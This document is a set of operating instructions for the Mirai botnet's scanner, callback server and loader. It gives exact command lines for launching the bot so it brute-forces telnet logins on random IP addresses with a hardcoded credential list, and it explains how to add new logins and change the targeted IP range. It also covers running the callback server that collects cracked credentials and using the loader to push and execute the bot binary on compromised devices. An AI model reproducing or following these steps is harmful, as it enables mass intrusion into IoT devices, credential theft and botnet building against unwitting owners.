# Scanner and Loader Instructions

### Running the bot with scanning enabled
run the bot with the last argument set as `1`
  * arguments: `sudo ./debug/mirai.dbg <cnc ip> <local ip> <callback ip> <enable scanner 0/1>`
  * e.g. `sudo ./debug/mirai.dbg 10.0.0.1 10.0.0.2 10.0.0.1 1`
  * you can also edit [mirai/demo-bot.sh](mirai/demo-bot.sh) to enable the flag for you

using the debug, telnet version, the bot will generate random ip addresses and check if a telnet daemon is running on port 23. it will then use its hardcoded list of logins to try to gain access to the device. 
  * the list of logins is in `scanner_init()` in [mirai/bot/scanner.c](mirai/bot/scanner.c) (use the `enc` tool to convert strings into the required format if you want to add new logins)
  * the range of ip addresses it generates can be set here: `get_random_ip()` in [mirai/bot/scanner.c](mirai/bot/scanner.c)

### Running the callback server
if successful, the bot will then report the vulnerable ip address, along with its login credentials to the callback server. 
  * a simple callback server is found here: [mirai/tools/scanListen.go](mirai/tools/scanListen.go), it is built as `scanListen`
  * run it as: `sudo ./debug/scanListen`
  * it listens on port `48102`

### Running the single loader
the single loader takes a list of input ip addresses, login credentials, and a binary to transmit (usually the bot itself). it then logs into each device on the list and uses telnet to transmit the binary. finally, it then launches the binary with the specified arguments. 
  * it is found here: [mirai/tools/single_load.c](mirai/tools/single_load.c) and is built as `single_load`
  * run it as: `./debug/single_load <bind ip> <input file> <path to file_to_load> <argument> <threads> <connections> (debug mode)`
  * e.g. `./debug/single_load 10.0.0.1 ./debug/input.txt ./debug/mirai.dbg "10.0.0.1 10.0.0.2 10.0.0.1 0" 1 1 1` (having the last argument, of any value, means that it runs in debug mode)
